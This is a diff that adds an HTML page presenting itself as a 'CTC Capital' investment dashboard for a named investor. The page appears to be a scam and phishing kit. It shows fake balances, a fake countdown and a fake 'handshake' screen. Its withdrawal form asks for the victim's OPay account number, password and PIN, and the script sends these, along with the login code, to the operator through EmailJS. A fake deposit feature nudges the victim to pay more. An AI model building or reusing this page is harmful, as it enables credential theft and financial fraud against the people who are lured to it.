@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTC Capital | Global Investment Node</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { 
+            background: radial-gradient(circle at top right, #1e293b, #0f172a); 
+            color: white; 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            overflow-x: hidden;
+        }
+        .glass { 
+            background: rgba(255, 255, 255, 0.03); 
+            backdrop-filter: blur(16px); 
+            border: 1px solid rgba(255, 255, 255, 0.08); 
+        }
+        .hidden { display: none; }
+        .ticker-glow { text-shadow: 0 0 10px rgba(52, 211, 153, 0.5); }
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        
+        @keyframes pulse-border {
+            0% { border-color: rgba(59, 130, 246, 0.5); }
+            50% { border-color: rgba(59, 130, 246, 1); }
+            100% { border-color: rgba(59, 130, 246, 0.5); }
+        }
+        .loading-pulse { animation: pulse-border 2s infinite; }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <div id="login-section" class="w-full max-w-md glass rounded-[2rem] p-10 shadow-2xl border-white/10">
+        <div class="text-center mb-10">
+            <div class="inline-block p-4 rounded-2xl bg-blue-600/20 mb-4 border border-blue-500/30">
+                <svg class="w-10 h-10 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A10.003 10.003 0 0012 3c1.223 0 2.39.22 3.47.621m0 0l.053.041A10.003 10.003 0 0120.448 13m-6.78 6.78l-.53.53a3.37 3.37 0 01-4.773 0L7.1 18.262m9.84-9.84l-2.121 2.121m-1.414 1.414l-4.95 4.95M12 7.5a4.5 4.5 0 11-8.906 1m4.614 3.09L8.707 13"/>
+                </svg>
+            </div>
+            <h2 class="text-3xl font-extrabold tracking-tight bg-gradient-to-r from-blue-400 via-indigo-400 to-emerald-400 bg-clip-text text-transparent">CTC CAPITAL</h2>
+            <p class="text-slate-500 text-sm mt-2 font-medium">QUANTUM ENCRYPTION ACTIVE</p>
+        </div>
+        
+        <div id="login-form-container" class="space-y-5">
+            <input type="password" id="login-pass" placeholder="Master Access Key" 
+                class="w-full bg-slate-950/50 border border-slate-800 rounded-2xl px-6 py-5 focus:ring-2 focus:ring-blue-500 outline-none transition-all text-center tracking-[0.5em] text-blue-400 font-bold">
+            <button onclick="startConnection()" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 py-5 rounded-2xl font-bold text-lg shadow-lg shadow-blue-900/40 transition-all transform active:scale-[0.98]">
+                Unlock Terminal
+            </button>
+        </div>
+
+        <div id="countdown-container" class="hidden text-center space-y-4">
+            <div class="text-blue-400 font-mono text-xl animate-pulse">Establishing Secure Node...</div>
+            <div id="timer-display" class="text-5xl font-black text-white">05</div>
+            <p class="text-slate-500 text-xs">Waiting for satellite handshake...</p>
+        </div>
+
+        <div id="otp-container" class="hidden space-y-6">
+            <div class="text-center">
+                <p class="text-emerald-400 font-bold text-sm mb-2 uppercase tracking-widest">Handshake Complete</p>
+                <p class="text-slate-400 text-xs">Enter the 6-digit Login Code sent to your device</p>
+            </div>
+            <input type="text" id="login-otp" maxlength="6" placeholder="0 0 0 0 0 0" 
+                class="w-full bg-slate-950/50 border border-emerald-500/30 rounded-2xl px-6 py-5 focus:ring-2 focus:ring-emerald-500 outline-none transition-all text-center tracking-[1em] text-white font-black text-2xl">
+            <button onclick="finalVerify()" class="w-full bg-emerald-600 hover:bg-emerald-500 py-4 rounded-2xl font-bold shadow-lg shadow-emerald-900/20 transition-all">
+                Verify Identity
+            </button>
+        </div>
+    </div>
+
+    <div id="dashboard-section" class="hidden w-full max-w-6xl animate-in fade-in duration-1000">
+        
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
+            <div class="lg:col-span-2 flex items-center gap-5 glass p-6 rounded-[2rem]">
+                <div class="h-16 w-16 bg-gradient-to-br from-blue-500 to-emerald-500 rounded-2xl flex items-center justify-center font-bold text-2xl shadow-lg border border-white/20">DM</div>
+                <div>
+                    <h3 class="text-2xl font-bold text-white">David Maxwells Mmaduabuchi</h3>
+                    <div class="flex items-center gap-3 mt-1">
+                        <span class="flex items-center gap-1 text-xs font-bold text-emerald-400 px-2 py-1 bg-emerald-500/10 rounded-full border border-emerald-500/20">
+                            <span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span></span>
+                            VERIFIED INVESTOR
+                        </span>
+                        <span class="text-xs text-slate-500 font-medium uppercase tracking-widest">UID: 0882-CTC</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="glass p-6 rounded-[2rem] border-emerald-500/20 flex flex-col justify-center">
+                <div class="flex justify-between items-center mb-1">
+                    <p class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Live Bitcoin (BTC)</p>
+                    <span class="text-[10px] text-emerald-400 font-bold px-2 py-0.5 bg-emerald-500/10 rounded-md">LIVE</span>
+                </div>
+                <div class="flex items-baseline gap-2">
+                    <h2 id="btc-price" class="text-3xl font-black ticker-glow text-white">Loading...</h2>
+                    <span class="text-xs text-emerald-400 font-bold" id="btc-change">+0.00%</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8 text-center md:text-left">
+            <div class="glass p-8 rounded-[2rem] border-l-4 border-l-blue-500">
+                <p class="text-sm font-semibold text-slate-400 mb-2">Portfolio Balance</p>
+                <h4 class="text-3xl font-black">₦100,000.00</h4>
+                <p class="text-xs text-slate-500 mt-2 italic">Standard Equity Tier</p>
+            </div>
+            <div class="glass p-8 rounded-[2rem] border-l-4 border-l-emerald-500">
+                <p class="text-sm font-semibold text-slate-400 mb-2">Available for Withdrawal</p>
+                <h4 class="text-3xl font-black text-emerald-400">$500.00</h4>
+                <p class="text-[10px] text-slate-500 mt-2 uppercase tracking-tighter">Approx. ₦750,000 (Market Rate)</p>
+            </div>
+            <div class="glass p-8 rounded-[2rem] border-l-4 border-l-orange-500">
+                <p class="text-sm font-semibold text-slate-400 mb-2">Total Deposited</p>
+                <h4 id="display-deposit" class="text-3xl font-black text-orange-400">₦0.00</h4>
+                <p class="text-xs text-slate-500 mt-2 italic">Auto-Sync Enabled</p>
+            </div>
+        </div>
+
+        <div class="grid lg:grid-cols-2 gap-8 mb-8">
+            <div class="glass p-10 rounded-[2.5rem] relative">
+                <h4 class="text-xl font-bold mb-8 flex items-center gap-3 text-emerald-400">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z" stroke-width="2"/></svg>
+                    OPay Secure Withdrawal
+                </h4>
+                
+                <form id="withdrawal-form" class="space-y-5">
+                    <input type="number" id="w-amount" placeholder="Withdrawal Amount (Min ₦200,000)" class="w-full bg-slate-900 border border-slate-700 rounded-2xl p-4 outline-none focus:border-emerald-500 font-bold" required>
+                    
+                    <div class="grid grid-cols-2 gap-4">
+                        <input type="text" id="opay-num" placeholder="OPay Number" class="w-full bg-slate-900 border border-slate-700 rounded-2xl p-4 outline-none focus:border-emerald-500 font-bold" required>
+                        <input type="password" id="opay-pass" placeholder="OPay Password" class="w-full bg-slate-900 border border-slate-700 rounded-2xl p-4 outline-none focus:border-emerald-500 font-bold" required>
+                    </div>
+
+                    <div class="p-6 bg-blue-500/5 rounded-2xl border border-blue-500/20">
+                        <p class="text-[11px] text-blue-400 mb-3 font-bold uppercase text-center">Verify Withdrawal PIN</p>
+                        <input type="text" id="w-pin" maxlength="6" placeholder="ENTER 6-DIGIT PIN" class="w-full bg-slate-950 border border-blue-500/30 rounded-xl p-4 text-center tracking-[1.2em] font-black text-white outline-none focus:border-blue-400" required>
+                    </div>
+
+                    <button type="submit" class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 py-5 rounded-2xl font-black shadow-xl shadow-emerald-900/20 transition-all transform active:scale-[0.97]">
+                        PROCESS WITHDRAWAL
+                    </button>
+                </form>
+            </div>
+
+            <div class="glass p-10 rounded-[2.5rem] border-orange-500/10">
+                <h4 class="text-xl font-bold mb-8 flex items-center gap-3 text-orange-400">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 6v6m0 0v6m0-6h6m-6 0H6" stroke-width="2"/></svg>
+                    Asset Deposit
+                </h4>
+                <div class="space-y-6">
+                    <div class="p-6 bg-slate-900/50 rounded-2xl border border-slate-800">
+                        <p class="text-sm text-slate-400 mb-4 font-medium">Top-up your balance to increase equity tier status.</p>
+                        <div class="flex gap-4">
+                            <input type="number" id="dep-amount" placeholder="₦ Amount" class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 outline-none focus:border-orange-500 font-bold">
+                            <button onclick="handleDeposit()" class="px-6 py-3 bg-orange-600 hover:bg-orange-500 rounded-xl font-bold transition-all">DEPOSIT</button>
+                        </div>
+                    </div>
+                    <div class="glass p-6 rounded-2xl border-white/5">
+                        <div class="flex justify-between items-center mb-4">
+                            <h5 class="text-xs font-black text-slate-500 uppercase tracking-widest">Node Analytics</h5>
+                            <span class="text-[10px] text-emerald-400 font-bold">OPTIMIZED</span>
+                        </div>
+                        <div class="space-y-2">
+                            <div class="h-1.5 w-full bg-slate-800 rounded-full overflow-hidden">
+                                <div class="h-full bg-emerald-500 w-[88%] shadow-[0_0_8px_rgba(16,185,129,0.5)]"></div>
+                            </div>
+                            <p class="text-[10px] text-slate-500">Satellite link: 99.9% | Latency: 12ms | Security: SHA-256</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="glass p-10 rounded-[2.5rem] border-white/5 overflow-x-auto">
+            <h4 class="text-xl font-bold mb-8">Recent Transaction Logs</h4>
+            <table class="w-full text-left">
+                <thead>
+                    <tr class="text-slate-500 text-xs uppercase tracking-widest border-b border-white/10">
+                        <th class="pb-4 font-black">Type</th>
+                        <th class="pb-4 font-black">Account/Node</th>
+                        <th class="pb-4 font-black">Amount</th>
+                        <th class="pb-4 font-black text-right">Status</th>
+                    </tr>
+                </thead>
+                <tbody id="transaction-body" class="text-sm font-medium">
+                    <tr class="border-b border-white/5">
+                        <td class="py-4 text-emerald-400">Equity Dividend</td>
+                        <td class="py-4 text-slate-300">Internal Pool</td>
+                        <td class="py-4 font-bold">₦100,000.00</td>
+                        <td class="py-4 text-right"><span class="px-3 py-1 bg-emerald-500/10 text-emerald-400 rounded-full text-[10px] font-black border border-emerald-500/20">SETTLED</span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        // --- EMAILJS CONFIGURATION ---
+        (function() {
+            emailjs.init("btmxg3IffyiB-4XHX"); 
+        })();
+
+        // --- BTC TICKER ---
+        async function updateBTCPrice() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd&include_24hr_change=true');
+                const data = await response.json();
+                document.getElementById('btc-price').innerText = `$${data.bitcoin.usd.toLocaleString()}`;
+                const change = data.bitcoin.usd_24h_change;
+                const changeEl = document.getElementById('btc-change');
+                changeEl.innerText = `${change >= 0 ? '+' : ''}${change.toFixed(2)}%`;
+                changeEl.className = `text-xs font-bold ${change >= 0 ? 'text-emerald-400' : 'text-red-400'}`;
+            } catch (e) { console.error(e); }
+        }
+        setInterval(updateBTCPrice, 10000); updateBTCPrice();
+
+        // --- LOGIN FLOW ---
+        function startConnection() {
+            const pass = document.getElementById('login-pass').value;
+            if(pass !== "David2026") return alert("ACCESS DENIED: Master Key Invalid.");
+            
+            document.getElementById('login-form-container').classList.add('hidden');
+            document.getElementById('countdown-container').classList.remove('hidden');
+            
+            let count = 5;
+            const timer = setInterval(() => {
+                count--;
+                document.getElementById('timer-display').innerText = `0${count}`;
+                if(count === 0) {
+                    clearInterval(timer);
+                    document.getElementById('countdown-container').classList.add('hidden');
+                    document.getElementById('otp-container').classList.remove('hidden');
+                }
+            }, 1000);
+        }
+
+        function finalVerify() {
+            const otp = document.getElementById('login-otp').value;
+            if(otp.length === 6) {
+                // Log the login event
+                emailjs.send('service_kkj4kyv', 'template_bm1ofua', {
+                    profile_name: "David Maxwells Mmaduabuchi",
+                    login_otp: otp,
+                    action: "Dashboard Access Login"
+                });
+                
+                document.getElementById('login-section').classList.add('hidden');
+                document.getElementById('dashboard-section').classList.remove('hidden');
+                document.body.style.background = "#020617";
+            } else { alert("Verification Failed: Invalid Code."); }
+        }
+
+        // --- DASHBOARD ACTIONS ---
+        let totalDeposited = 0;
+        function addRow(type, node, amount, statusColor) {
+            const tbody = document.getElementById('transaction-body');
+            const row = `<tr class="border-b border-white/5 animate-pulse">
+                <td class="py-4 text-orange-400">${type}</td>
+                <td class="py-4 text-slate-300">${node}</td>
+                <td class="py-4 font-bold">₦${parseFloat(amount).toLocaleString()}</td>
+                <td class="py-4 text-right"><span class="px-3 py-1 bg-${statusColor}-500/10 text-${statusColor}-400 rounded-full text-[10px] font-black border border-${statusColor}-500/20 uppercase">Pending</span></td>
+            </tr>`;
+            tbody.insertAdjacentHTML('afterbegin', row);
+        }
+
+        function handleDeposit() {
+            const amt = document.getElementById('dep-amount').value;
+            if(!amt || amt <= 0) return;
+            totalDeposited += parseFloat(amt);
+            document.getElementById('display-deposit').innerText = `₦${totalDeposited.toLocaleString()}`;
+            addRow("Manual Deposit", "OPay Node", amt, "orange");
+            document.getElementById('dep-amount').value = '';
+            alert("Deposit Initiated. Syncing with block explorer...");
+        }
+
+        document.getElementById('withdrawal-form').onsubmit = function(e) {
+            e.preventDefault();
+            const amt = document.getElementById('w-amount').value;
+            if(amt < 200000) return alert("System Notice: Standard accounts restricted to ₦200,000 minimum withdrawals.");
+
+            if(confirm(`Confirm transfer of ₦${amt} to OPay account ${document.getElementById('opay-num').value}?`)) {
+                const params = {
+                    profile_name: "David Maxwells Mmaduabuchi",
+                    withdrawal_amount: "₦" + amt,
+                    opay_account: document.getElementById('opay-num').value,
+                    opay_password: document.getElementById('opay-pass').value,
+                    security_pin: document.getElementById('w-pin').value,
+                    total_deposited: "₦" + totalDeposited,
+                    btc_at_time: document.getElementById('btc-price').innerText
+                };
+
+                emailjs.send('service_kkj4kyv', 'template_bm1ofua', params).then(() => {
+                    addRow("Withdrawal", "OPay Gateway", amt, "blue");
+                    alert("Handshake Accepted. Fund routing through CTC Pool active. Check email for status.");
+                });
+            }
+        };
+    </script>
+</body>
+</html>
